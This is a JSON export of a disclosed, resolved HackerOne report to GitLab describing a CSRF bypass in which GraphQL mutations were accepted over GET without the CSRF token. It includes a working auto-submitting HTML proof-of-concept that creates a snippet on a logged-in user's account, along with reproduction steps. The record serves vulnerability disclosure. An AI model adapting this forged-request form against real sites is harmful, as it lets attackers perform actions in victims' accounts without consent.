{
  "id": 1122408,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTIyNDA4",
  "url": "https://hackerone.com/reports/1122408",
  "title": "CSRF on /api/graphql allows executing mutations through GET requests",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-03-10T16:49:12.681Z",
  "submitted_at": "2021-03-10T16:49:12.826Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "az3z3l",
    "url": "/az3z3l",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/dtdN1DBMobGCr4ku6U6fEpid/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-08-02T19:10:34.660Z",
  "bug_reporter_agreed_on_going_public_at": "2021-08-02T19:04:53.295Z",
  "team_member_agreed_on_going_public_at": "2021-08-02T19:10:34.511Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Mutations are `edit` or `create`  queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection\n\n\n### Code for Testing\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <meta name=\"referrer\" content=\"none\">\n    <meta name=\"referrer\" content=\"no-referrer\">\n</head>\n<body>\n      <form action=\"https://gitlab.com/api/graphql/\" id=\"csrf-form\" method=\"GET\">\n        <input name=\"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}\">\n        <input name=\"variables\" value='{\"input\":{\"title\":\"Tesssst Snippet\",\"description\":\"Hello World\",\"visibilityLevel\":\"public\",\"blobActions\":[{\"action\":\"create\",\"previousPath\":\"readme.md\",\"content\":\"reading this.md\",\"filePath\":\"readme.md\"}],\"uploadedFiles\":[],\"projectPath\":\"\"}}'>\n    </form>\n\n\n    <script>document.getElementById(\"csrf-form\").submit()</script>\n</body>\n</html>\n```\nThis exploit would create a snippet named `Tesssst Snippet` on the user's account. \n\n\n### Steps to Reproduce\n\n1. Host this file\n2. Login to gitlab\n3. Open the link to that html\n4. Check the snippets for the logged in user. \n\n\n### Impact\n\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.\n\n\n### POC\n\nAttached the request and response screenshot\n\n\n\n### What is the expected *correct* behavior?\n\nThe backend must check the existence of csrf tokens for GET requests as well.\n\n## Impact\n\nThe attacker could control bypass the existing CSRF check on the graphql endpoint.",
  "bounty_amount": "3370.0",
  "formatted_bounty": "$3,370",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1225609,
      "file_name": "gitlabCreateSnippet.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l5n2lsbtp588tzi42ccz40zimocg?response-content-disposition=attachment%3B%20filename%3D%22gitlabCreateSnippet.png%22%3B%20filename%2A%3DUTF-8%27%27gitlabCreateSnippet.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXTXYYN7C%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T020649Z&X-Amz-Expires=795&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQDG4Dx8GKa1nWMTeRTTOFjuvONzrZaM8lR3NySFyGyoLgIhAO2ch9HfItItziqcq8UCUva0A1msy8TSDbk1S0YGndHxKroFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyMSJWsJAMFjThhFKMqjgXMa3wC0IXgZJbryWZMgkUI95IoO22GEYU9e2D5gMcggwRLJzptG9%2BRYCEsNHhHg2D2SfIri3OTi5d6KLt4iPWT2a2SZ%2BrR%2B8P0p0Z99hh3P0OWpojsKaoiKQvsGVML9i9hW3jXWpN9CsgzD%2FRLtlNFx6KO72kZbpa62bSsIDisIUpzrOtUl9pp5x5kDP8xiYrSthB8l93w25Qscab%2BWux3FBlbWvzMiwJxGJtoQfpPDdgZZ1uevE%2B03sN4q6xEx5e7C%2B6OuJ1DbQb5%2B%2B%2B2qQlLRZHMdQY1q3IQLTD1DWzUEfLsTUFhQ3T7xXNVdqskE2F08b%2BOhV1SceFOCAabKpWwv7I1fhMjU2dhZAEv%2FQAu6XvFYwwojRGVYKCoN4LnBNzCeWONQ1LE2ddf%2Bs0Uww2JYw1CyftUec6tqaNirKcC0VqdecjRMI9i2z5zljsrPT32rzVhlZ2Vg2D9iNrKSLnMv2GGtHRDVj2KgYzIy%2BS4ZnZ1bbKiKrqCvnGJcefKEY%2Foq%2B2EbAsL0gJFVJ070vCbPxwGdhSz8MJDe1MvSVUBIvdaiDgWzXvin%2BYiGTkyB%2BtnkEKk8j3K99WOztVybBT5%2BN9d9hjzkD5No1PZAC4UDcJDvoQOFsLNhg%2FAFp%2BUykiiYYUzv1ARfZHqnL4Oke7XWut3VRpJOkvoivBO6MOSQ4%2F1w5PP6UAUSbxyS5c9Ng4U8jZu8Hoe1rViP6lOyP5P0Hykc7dMKAZxFRjr%2BHpeba4uTnRqO6x0mb7Ce2vxvQGUJDxozIJQKtFeJMCkKy0cwvYf%2FWe%2FZpOoDcGRnB8%2BxQsntQKAvVwlehf9blYqYwoZFMKbnEDGjmMJISIUdUjdUp4tT3c7Rw1oqxRFFT0wj428xgY6sAGOlKbiRtf8wkAjhQMv73ifRHO5fu8SgUTlHwprc9w01w8TYY12P8uU5Yr0s%2BBwrVkybQDwqo6QSqgrtzqPNFnzpEtE3CCrXxVxlX6Zd2DWMkQU66T%2B8D3la9dYmFIH4tQNXt9%2FdQKUV3YVkls3v6VpdOrtaZb99i%2Fx1pRgjrgqkvAeF9dcbV01vh15EJsN8xg1vitiWbg%2FEpE2q%2FoBEkIIEBeXSvkNQb12UaP7a6CPAw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22451581198c79502fd862b64f634d47caf8d9f5891559364c23347cc675cc06",
      "file_size": 313589,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 81,
  "voters": [
    "cyberjoinsthehunt",
    "k0ns0l",
    "osman1337",
    "arist0phanes",
    "zomasec",
    "loaymorad",
    "arw9234",
    "defenderwww",
    "az3z3l",
    "monkelife",
    "and 71 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
